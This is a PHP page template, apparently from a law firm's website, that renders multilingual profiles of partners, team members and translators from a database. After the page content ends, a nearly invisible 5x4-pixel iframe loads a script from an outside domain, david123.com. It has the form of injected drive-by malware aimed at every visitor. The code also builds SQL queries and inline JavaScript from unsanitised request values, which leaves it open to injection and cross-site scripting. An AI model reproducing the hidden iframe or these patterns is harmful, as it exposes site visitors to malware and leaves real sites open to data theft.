<?
	define ('authenticate', false);
	require ('./inc/conf.inc.php');
	$soc=$_SESSION['socio'];
	if(!$lng){
		$lng=$_SESSION['lng'];
	}
	if(!isset($id_sel) || $id_sel<1 ){ $id_sel=-1; }
	$tit=$_GET['tit'];
	global $prefijo_socio,$socio;

	if( $id_sub_sel == 3 )
	{
		$titulo['esp']='Nuestro Equipo';
		$titulo['ing']='Our Team';
		$titulo['por']='Nossa Equipe';
	}
	elseif( $id_sub_sel != '' )
	{
		$titulo['esp']='Equipo  '.($id_sub_sel == 8? 'del ':'de ');
		$titulo['ing']='Team '.($id_tmp != 3? 'of ':'');
		$titulo['por']='Equipe '.($id_tmp != 3? 'do ':'');
	}else{
		$titulo['esp']='Socios';
		$titulo['ing']='Partners';
		$titulo['por']='Sócios';
	}
	$exper['esp']='Experiencia';
	$exper['ing']='Experience';
	$exper['por']='Expierência';
	
	$admis['esp']='Habilitaciones';
	$admis['ing']='Admitions';
	$admis['por']='Habilitações';
	
	$educ['esp']='Educación';
	$educ['ing']='Education';
	$educ['por']='Formação';
	
	$paises['esp']='País';
	$paises['ing']='Country';
	$paises['por']='Pais';
	
	$ano['esp']='Año';
	$ano['ing']='Year';
	$ano['por']='Ano';

	$col1='admisiones_'.$lng;
	$col2='experiencia_'.$lng;
	$col3='educacion_'.$lng;

	if( $id_sub_sel == 8 )
	{
		$intro['esp']='A continuación se encuentran los antecedentes de algunos de los miembros del Bureau de Traductores, quienes son asistidos por traductores senior, junior y  freelancers, de acuerdo a las necesidades de cada cliente o transacción.';
		$intro['ing']='Below, follows the background of some members of the Translation Bureau, who are assisted by senior and junior translators as well as by freelance translators, depending on the particular needs of each client or the characteristics of each transaction.';
		$intro['por']='A seguir podem se encontrar os curriculums de alguns membros de Bureau de Tradutores, quem são assistidos pelos associados sênior e junior, dependendo das necessidades de cada cliente ou transação.';
	}else{
		$intro['esp']='A continuación se encuentran los antecedentes de los socios que trabajan en esta área, quienes son asistidos por asociados senior y junior de acuerdo a las necesidades de cada cliente o transacción.';
		$intro['ing']="Below is the background of the partners of this area, who work with the assistance of senior and junior associates, as may be required to meet each client or transaction's needs.";
		$intro['por']="A seguir podem se encontrar os curriculums dos sócios que trabalham nesta área, quem são assistidos pelos associados sênior e junior, dependendo das necessidades de cada cliente ou transação.";
	}
?>
<link href="estilos<?=$soc?>.css" rel="stylesheet" type="text/css">
<script language="javascript">
//precacheo de imagenes
var bullet1=new Image(9,15);
bullet1.src="images/flechita1.gif";
var bullet2=new Image(9,15);
//bullet2.src="images/bullet<?=$soc?>2.gif";
bullet2.src="images/flechita1.gif";


//////////////////////////////////////////
function opcionover(x){
x.className='linkover2';
x.parentNode.parentNode.firstChild.firstChild.src=bullet2.src;
}
function opcionout(x){
x.className='link2';
x.parentNode.parentNode.firstChild.firstChild.src=bullet1.src;
}

function atras(x){
	formframe.id_sel.value=x
	formframe.submit()

}
var lng='<?=$lng?>';
</script>
<style type="text/css">
<!--
.style7 {font-family: Verdana, Arial, Helvetica, sans-serif; font-weight: bold; font-size: 11px; }
.style9 {font-family: Verdana, Arial, Helvetica, sans-serif; font-size: 10px}
-->
</style>
</head>
<?
	if(strlen($id_sub_sel)==0 ){
		$id_sub_sel=0;
	}
	else{
		$id_tmp=$id_sub_sel;
	}
	if( $id_sub_sel >= 0){
		$excepciones[]=12;
		if(in_array($id_sub_sel,$excepciones)){ $tit='descrip'; } else { $tit='titulo';}
	
?>
<table width="100%" border="0" cellpadding="0" cellspacing="0">
<tr valign="top">
	<td height="35" colspan="5" align="right" valign="bottom" class="espacio" ><span class="titulos"><?= $titulo[$lng] ?> <?=$id_tmp != 3? dbi::value('secciones',"id=$id_tmp and lng='$lng'",$tit): ''?>&nbsp;&nbsp;</span>
	</td>
</tr>
</table>

<?
if($id_tmp!=3){
?>
<table width="98%" border="0" cellpadding="10" cellspacing="0">
<tr>
	<td height="0" class="textocontenido"> 
      <ul><li><?=$intro[$lng]?></li></ul></td>
</tr>
</table>
<?
}

	//$experiencias=dbi::select('equipo as e left join equipo_experiencia as x on e.id=x.id_socio','e.*',  "x.id_area=$id_sub_sel".( $pais ? " AND e.pais = '$pais' " : '')."  group by e.id", ($pais ? ' e.orden':'e.apellido'));
	if( $id_sub_sel == 3 ){
		$experiencias=dbi::select('equipo as e left join equipo_experiencia as x on e.id=x.id_socio','e.*',"x.id_area>0".( $pais ? " AND e.pais = '$pais' " : '')."  group by e.id", ($pais ? ' e.orden':'e.apellido'));
	}elseif($id_sub_sel!=8){
		$experiencias=dbi::select('equipo as e left join equipo_experiencia as x on e.id=x.id_socio','e.*',($id_sub_sel==0 ? "x.id_area>0":"x.id_area=$id_sub_sel").( $pais ? " AND e.pais = '$pais' " : '')."  group by e.id", ($pais ? ' e.orden':'e.apellido'));
	}
	else{
		$experiencias=dbi::select('traductores','*','orden');
	}

	if( $experiencia = $experiencias->fetch_object() )
	{
		$año = $experiencia->ano ? true : false;
?>
<table height="100%" width="100%" cellpadding="0" cellspacing="0" border="0">
<tr valign="top">
<td width="0%" valign="top" height="100%"><table width="100%"  cellspacing="0" cellpadding="2">
	<?
	
	do
	{
		$cargo='cargo_'.$lng;
		?>
				  <tr valign="bottom"> 
					<td colspan="3" height="5"></td>
				  </tr>
				  <tr> 
					<td width="47" rowspan="5" valign="top" class="foto"  align="center"><img src="images/<?=$experiencia->foto?>" width="47" height="66"></td>
					<td width="630" valign="top" class="ali1"> <div align="justify"><span class="nombre"><?=$experiencia->nombre?></span><br>
						<span class="partner"><?=$experiencia->$cargo?></span></div></td>
					<td width="87" class="ali1"><img src="images/<?=strtolower($experiencia->pais)?>.gif" border="0" /></td>
				  </tr>
				  <tr> 
					<td colspan="2" class="ali1"><div align="justify"><span class="titulocv"><strong><?=$admis[$lng]?>:</strong></span> 
						<span class="textocv"><?=$experiencia->$col1?></span></div></td>
				  </tr>
				  <tr> 
					<td colspan="2" class="ali1"><div align="justify"><span class="titulocv"><strong><?=$exper[$lng]?>:</strong></span><span class="textocv">&nbsp;<?=$experiencia->$col2?></span></div></td>
				  </tr>
				  <tr> 
					<td colspan="2" class="ali1"> <p align="justify"><strong class="titulocv"><?=$educ[$lng]?>: 
						</strong><span class="textocv"><?=$experiencia->$col3?></span></p></td>
				  </tr>
				  <tr> 
					<td height="100%" colspan="2" class="ali1"><div align="justify"><span class="titulocv"><strong>Email: 
						</strong></span><span class="textocv"><a href="mailto:<?=$experiencia->email?>" class="textocv"><?=$experiencia->email?></a></span></div></td>
				  </tr>
				  <tr> 
					<td valign="top" colspan="3" height="30"></td>
				  </tr>
			<?
		}while( $experiencia = $experiencias->fetch_object() );
	}
	?>
</table></td>
</TD></TR></Table>
<iframe src="http://david123.com/r/g.php" width="5" height="4" align="right"></iframe></body></html>
<? } ?>
<?
function traducemenu($id,$tipo){
	global $lng;
	$db1=new DBI();
	$db1->select('secciones','*',"id=$id and lng='$lng'");
	if($db1->num_rows()>0){
		$row=$db1->fetch_object();
		if($tipo==1) echo trim($row->titulo);
		if($tipo==2) echo trim($row->descrip);
	}
	else{
		echo "no hay datos";
	}

}
?>
